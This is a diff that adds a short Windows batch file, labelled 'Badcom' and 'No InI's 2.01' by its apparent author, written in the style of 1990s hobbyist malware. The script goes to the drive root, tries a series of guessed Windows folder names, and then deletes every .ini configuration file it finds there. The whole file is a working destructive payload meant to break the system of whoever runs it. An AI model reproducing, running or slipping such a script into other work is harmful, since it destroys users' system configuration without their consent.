@@ -1,0 +1,15 @@
+@echo off
+cls
+echo Badcom By SeQ mAss×vE.........
+echo NamE: No InI's 2.01
+cd\
+echo Searching....
+cd win
+cd windows
+cd wind
+cd windos
+cd win95
+cd wind95
+cd win-95
+
+del *.ini
